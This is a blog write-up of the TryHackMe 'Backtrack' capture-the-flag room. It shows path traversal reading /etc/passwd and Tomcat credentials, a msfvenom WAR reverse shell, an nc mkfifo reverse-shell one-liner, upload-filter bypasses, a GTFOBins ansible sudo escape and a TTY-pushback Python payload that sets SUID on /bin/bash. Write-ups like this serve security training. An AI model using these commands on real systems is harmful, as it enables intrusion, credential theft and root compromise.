---
title: "Backtrack"
date: 2025-11-29
draft: false
summary: "Writeup for Backtrack CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "rce", "lfi", "sudo", "tty pushback", "file upload"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/backtrack/cover.webp"
  caption: "Backtrack TryHackMe Challenge"
  alt: "Backtrack cover"
platform: "TryHackMe"
---

Daring to set foot where no one has.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/backtrack

## Reconnaissance

I performed an **nmap** aggressive scan on the target and found a bunch of open ports.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN backtrack.nmap
```

![](https://cdn.ziomsec.com/backtrack/1.webp)

## Initial Foothold

I found a **tomcat** landing page on port 8080 a service called *Aria 2 WebUI* running on port 8888.

![](https://cdn.ziomsec.com/backtrack/2.webp)

![](https://cdn.ziomsec.com/backtrack/3.webp)

A simple google search about *Aria 2 WebUI* revealed a path traversal vulnerability in it.
- https://security.snyk.io/vuln/SNYK-JS-WEBUIARIA2-6322148

I was able to read local files using this. The `/etc/passwd` file revealed the users present on the system.

```shell
curl --path-as-is http://TARGET:8888/../../../../../../../../etc/passwd -s | grep "/bin/bash"
```

![](https://cdn.ziomsec.com/backtrack/4.webp)

I then found the path of the **Tomcat** configuration file and read it. This file revealed the username and password for the tomcat manager.

```shell
curl --path-as-is http://TARGET:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml
```

![](https://cdn.ziomsec.com/backtrack/5.webp)

However, when I tried accessing the manager panel using the credentials, it did not work. I was able to access the *Server-Status* endpoint which meant that the credentials were indeed valid.

![](https://cdn.ziomsec.com/backtrack/6.webp)

I referred to the following articles:
- https://www.hackingarticles.in/tomcat-penetration-testing/
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html?highlight=tomcat#msfvenom-reverse-shell

I used them as a reference to generate a malicious payload that I could upload for a reverse shell. I also found a way to upload the file through command line through **stack overflow**.
- https://stackoverflow.com/questions/25029707/how-to-deploy-war-file-to-tomcat-using-command-prompt

Finally, I uploaded the payload and accessed it to get a reverse shell.

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=80 -f war -o revshell.war

curl --upload-file revshell.war 'http://tomcat:OPx52k53D80kTZpx4fr@TARGET:8080/manager/text/deploy?path=/revshell'

curl http://TARGET:8080/revshell/
```

![](https://cdn.ziomsec.com/backtrack/7.webp)

```shell
rlwrap nc -lnvp 80
```

![](https://cdn.ziomsec.com/backtrack/8.webp)

I got a shell as **tomcat**, but did not have the permissions to access the contents inside the other user directories. I switched back to my home directory and found the first flag.

```shell
cat /opt/tomcat/flag1.txt
```

![](https://cdn.ziomsec.com/backtrack/9.webp)

## Lateral Movement

I listed my **sudo** privileges and found that I could run a binary on a bunch of **Yml** files. One interesting thing about the allowed command is the **wildcard (`*`)** denoting all **yml** files. I could use backtracks to point to any other **yml** file of my choice.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/backtrack/10.webp)

**GTFOBins** had a way to exploit this to escalate privilege.
- https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo

I followed the methods described on **GTFOBins** and spawned a shell as **wilbur**.

```shell
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > shell.yml
chmod 777 shell.yml
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbook/../../../../../tmp/shell.yml

```

![](https://cdn.ziomsec.com/backtrack/11.webp)
> note: I used backtracks to point to the new **yml** file that I had created.

![](https://cdn.ziomsec.com/backtrack/12.webp)

I spawned an interactive **bash** shell.

```shell
/bin/bash -i
export TERM=xterm
```

After getting shell access as **wilbur**, I read the contents inside the home directory and found a note that contained the credentials of **orville** for a custom web app that was running locally.

![](https://cdn.ziomsec.com/backtrack/13.webp)

I listed the active ports and found port **80** on listening state.

```shell
netstat -antp
```

![](https://cdn.ziomsec.com/backtrack/14.webp)

I also found my credentials in a hidden file called *`.just_in_case.txt`*

![](https://cdn.ziomsec.com/backtrack/15.webp)

I then connected to the target using these credentials to get a better shell.

```shell
ssh wilbur@TARGET
```

I also performed Local port forwarding using these credentials to access the custom web application.

```shell
ssh -L 80:127.0.0.1:80 wilbur@TARGET
```

I then accessed the web application through my browser.

![](https://cdn.ziomsec.com/backtrack/16.webp)

I accessed the login panel and logged in using the credentials that I had discovered earlier.

![](https://cdn.ziomsec.com/backtrack/17.webp)

I tried uploading a reverse shell but failed to do so due to file type restrictions.

![](https://cdn.ziomsec.com/backtrack/18.webp)

I then created a simple web shell and tried various bypass techniques and finally managed to upload the file using **double extensions** ( `shell.png.php` ).

![](https://cdn.ziomsec.com/backtrack/19.webp)

I then tried executing a command but failed.

![](https://cdn.ziomsec.com/backtrack/20.webp)

I tried uploading the file outside it's intended directory.

![](https://cdn.ziomsec.com/backtrack/21.webp)

However, it did not work. **Double URL encoding** the backtracks bypassed the restrictions and allowed me to upload the file outside the *uploads* directory.

![](https://cdn.ziomsec.com/backtrack/22.webp)

Finally, I was able to execute commands. I then used **nc** to get a reverse shell from the target.

```shell
curl 'http://127.0.0.1/shell.png.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20TARGET%20PORT%20%3E%2Ftmp%2Ff'
```

Since the application was running as **orville**, I got a shell as that user.

```shell
rlwrap nc -lnvp 1337
```

![](https://cdn.ziomsec.com/backtrack/23.webp)

I then captured the second flag from the home directory.

```shell
cat /home/orville/flag2.txt
```

![](https://cdn.ziomsec.com/backtrack/24.webp)

## Privilege Escalation

There was a zip file so I transferred it on my local system. When I uncompressed the file, I realized it was only a backup of the web application.

![](https://cdn.ziomsec.com/backtrack/25.webp)

I did not find anything useful on the target. One thing that I noticed when I uncompressed the backup was that it contained the malicious **php** file that I had uploaded to get a shell as **orville**. This meant that the backups were being made periodically. 

To monitor the background tasks, I download **pspy** and transferred it onto the system.
- https://github.com/DominicBreuker/pspy

Running **pspy** revealed something interesting...

```shell
chmod +x pspy64
./pspy64
```

Multiple commands were being executed as root and then the user was changed to **orville**.

![](https://cdn.ziomsec.com/backtrack/26.webp)

When root switched to **Orville** using the command `su - orville`, it created a new shell for orville. The `-` in the command basically acts like a full login for **Orville**.

So, the root shell doesn't actually end. It just runs in the background while **Orville**’s shell spawns in the foreground. I found an article that spoke about this privesc vector: https://www.errno.fr/TTYPushback.html

Instead of exiting **Orville**’s shell (as this could close the entire session), we could use this technique to send a `sigstop` signal, to pause the **orville** shell and switch back to the original root shell that is running in the background.

I created the following **python** payload to add an **SUID** bit on the `/bin/bash` binary and transferred it on the target.

```python
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
	fcntl.ioctl(0, termios.TIOCSTI, char)
```

I then added the command to execute this in the **`.bashrc`** file so that it could be executed when the root user switched to **orville**.

```shell
echo 'python3 /home/orville/evil.py' >> .bashrc
```

![](https://cdn.ziomsec.com/backtrack/27.webp)

After some time, an SUID bit was added to the `/bin/bash` binary.

```shell
ls -la /bin/bash
```

![](https://cdn.ziomsec.com/backtrack/28.webp)

Finally, I executed **bash** in privileged mode and got root access.

```shell
/bin/bash -p
```

![](https://cdn.ziomsec.com/backtrack/29.webp)

I then captured the final flag from root user's home directory.

```shell
cat /root/flag3.txt
```

![](https://cdn.ziomsec.com/backtrack/30.webp)

I also found the root credentials inside the **manage.py** file present in the `/root` directory.

```shell
cat /root/manage.py
```

![](https://cdn.ziomsec.com/backtrack/31.webp)

That's it from my side!
Until next time :)

---